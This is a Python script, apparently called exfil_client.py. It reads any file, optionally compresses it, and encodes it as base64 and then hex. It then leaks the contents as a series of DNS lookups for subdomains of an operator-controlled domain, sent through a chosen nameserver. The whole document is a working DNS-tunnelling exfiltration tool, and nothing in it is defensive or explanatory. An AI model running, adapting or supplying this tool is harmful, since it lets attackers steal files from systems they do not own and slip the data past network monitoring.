import dns.resolver
import base64
import gzip
import sys
import os

def send_data(filename, data, domain, dns_server_ip, use_gzip):
    if use_gzip:
        data = gzip.compress(data)
        
    # Base64 encode data
    base64_data = base64.b64encode(data).decode()
    
    # Split base64_data into chunks of 31 characters max (each character will be hex encoded to 2 characters)
    chunk_size = 62  # This results in 62 characters when hex encoded
    data_chunks = [base64_data[i:i + chunk_size] for i in range(0, len(base64_data), chunk_size)]
    
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server_ip]
    
    for index, chunk in enumerate(data_chunks):
        hex_chunk = chunk.encode().hex()
        hex_chunk_1 = hex_chunk[:len(hex_chunk) // 2]
        hex_chunk_2 = hex_chunk[len(hex_chunk) // 2:]
        subdomain = f"{hex_chunk_1}.{hex_chunk_2}.{domain}"
        try:
            resolver.resolve(subdomain, 'A')
        except dns.resolver.NXDOMAIN:
            pass  # Expecting NXDOMAIN for these requests

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 exfil_client.py <file_path> <domain> <dns_server_ip> <use_gzip>")
        sys.exit(1)
    
    file_path = sys.argv[1]
    domain = sys.argv[2]
    dns_server_ip = sys.argv[3]
    use_gzip = sys.argv[4].lower() == 'true'
    
    if not os.path.exists(file_path):
        print(f"Error: File '{file_path}' does not exist.")
        sys.exit(1)
    
    filename = os.path.basename(file_path)
    
    with open(file_path, 'rb') as file:
        data = file.read()
    
    send_data(filename, data, domain, dns_server_ip, use_gzip)